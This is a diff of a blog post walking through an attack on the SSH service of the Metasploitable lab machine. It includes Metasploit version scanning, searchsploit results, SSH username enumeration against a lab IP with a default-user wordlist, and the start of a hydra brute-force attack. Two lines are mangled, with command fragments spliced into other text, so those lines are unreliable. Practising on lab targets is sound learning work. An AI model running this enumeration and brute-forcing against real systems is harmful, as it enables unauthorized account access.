@@ -1,7 +1,9 @@
 # More hacking!
 
 This is a follow up of my last post on hacking that can be read [here](https://filimon-danopoulos.github.io/posts/2014-11-12_Metasploitable-1.html). 
-This time I will try my hands on the next service running on port 22.
+This time I will try my hands on the next service running on port 22. During this exercise I searched the web a bit and found numerous guides
+on how to hack the Metasploitable machine. Since I want the excitement of finding something my self I have not read any post on the subject and I will not do that either.
+This means I might very well find sub-optimal solutions for some problems, deal with it!
 
 ## The target
 
@@ -60,8 +62,8 @@ A quick search in the Metasploit console gives me:
      post/multi/gather/ssh_creds                                                  normal     Multi Gather OpenSSH PKI Credentials Collection
      post/windows/gather/credentials/mremote                                      normal     Windows Gather mRemote Saved Password Extraction
 
-This is a lot to take in and at first glance nothings seems applicable to my case. So instead of wasting time going through everything
-I decided to only run `auxiliary/scanner/ssh/ssh_version` in order to verify that hte version I found earlier is valid.
+This is a lot to take in and at first glance nothing seems applicable as a quick exploit. So instead of wasting time going through everything
+I decided to only run `auxiliary/scanner/ssh/ssh_version` in order to verify that the version I found earlier is valid.
 
     msf > use auxiliary/scanner/ssh/ssh_version  
     msf auxiliary(ssh_version) > show options
@@ -83,11 +85,11 @@ I decided to only run `auxiliary/scanner/ssh/ssh_version` in order to verify tha
     [*] Scanned 1 of 1 hosts (100% complete)
     [*] Auxiliary module execution completed
     
-This verifies the version. Onwards to the next step!
+This verifies the version. Let's go to the next step!
 
 ### Searching
 
-Nothinh fruitfull yet so I turn to the next tool, `searchsploit`.
+Nothing fruit full yet so I turn to the next tool, `searchsploit`.
 
     # searchsploit openssh
      Description                                                                         Path
@@ -107,11 +109,62 @@ Nothinh fruitfull yet so I turn to the next tool, `searchsploit`.
     OpenSSH 3.x Challenge-Response Buffer Overflow Vulnerabilities (1)                | /unix/remote/21578.txt
     OpenSSH 3.x Challenge-Response Buffer Overflow Vulnerabilities (2)                | /unix/remote/21579.txt
 
-Again nothing that seems directly applicaple so I scrap the idea of finding an exploit manually. 
-At this stage I would apply a vulnerability scanner but I couldnt get openvas to function correctly so 
-I decided to try a common SSH vulnerability. Bruteforcing!
+Again nothing that seems directly applicable so I scrap the idea of finding an exploit manually. 
+At this stage I would apply a vulnerability scanner but I couldn't get openvas to function correctly and couldn't be bothered
+to figure out how to set it up correctly so I decided to try a common SSH vulnerability. Brute-forcing!
 
-### Bruteforcing
+### Brute-forcing
+
+I glance over the result from the metasploit search I did earlier to find something that would help with the brute forcing and see `auxiliary/scanner/ssh/ssh_enumusers`.
+Having a set of valid users will really help speed up the brute forcing so I check if it is applicable (edited for brevity):
+
+    msf > info auxiliary/scanner/ssh/ssh_enumusers 
+
+    Name: SSH Username Enumeration
+    Module: auxiliary/scanner/ssh/ssh_enumusers
+    License: Metasploit Framework License (BSD)
+    Rank: Normal
+
+    Description:
+      This module uses a time-based attack to enumerate users on an 
+      OpenSSH server. On some versions of OpenSSH under some 
+      configurations, OpenSSH will return a "permission denied" error for 
+      an invalid user faster than for a valid user.
+
+    References:
+      http://cvedetails.com/cve/2006-5229/
+      http://www.osvdb.org/32721
+      http://www.securityfocus.com/bid/20418
+
+
+This doesn't tell me the affected version I check the security focus [link](http://www.securityfocus.com/bid/20418) found under references. 
+One of the affected versions is the one are running, sweet!
+
+    msf > use auxiliary/scanner/ssh/ssh_enumusers 
+    msf auxiliary(ssh_enumusers) > show options
+
+    Module options (auxiliary/scanner/ssh/ssh_enumusers):
+
+       Name       Current Setting  Required  Description
+       ----       ---------------  --------  -----------
+       Proxies                     no        Use a proxy chain
+       RHOSTS                      yes       The target address range or CIDR identifier
+       RPORT      22               yes       The target port
+       THREADS    1                yes       The number of concurrent threads
+       THRESHOLD  10               yes       Amount of seconds needed before a user is considered found
+       USER_FILE                   yes       File containing usernames, one per line
+
+    msf auxiliary(ssh_enumusers) > set RHOSTS 192.168.56.103
+    RHOSTS => 192.168.56.103
+    msf auxiliary(ssh_enumusers) > set USER_FILE /usr/share/metasploit-framework/data/wordlists/default_users_for_services_unhash.txt                set USER_FILE ./usr/share/metasploit-framework/data/wordlists/default_users_for_servi
+    USER_FILE => /usr/share/metasploit-framework/data/wordlists/default_users_for_services_unhash.txt
+    msf auxiliary(ssh_enumusers) > run
+
+    [*] 192.168.56.103:22 - SSH - Checking for false positives
+    [*] 192.168.56.103:22 - SSH - Starting scan
+
+After running this for a while I decided to stop the scan, it's super slow and will probably not speed up the overall process much.
+
 
 The number one tool for brute/root/Desktop/password.lst -vV 192.168.1.1 ftpforcing is probably `hydra ` so I will launch a bruteforce attack with it:
 
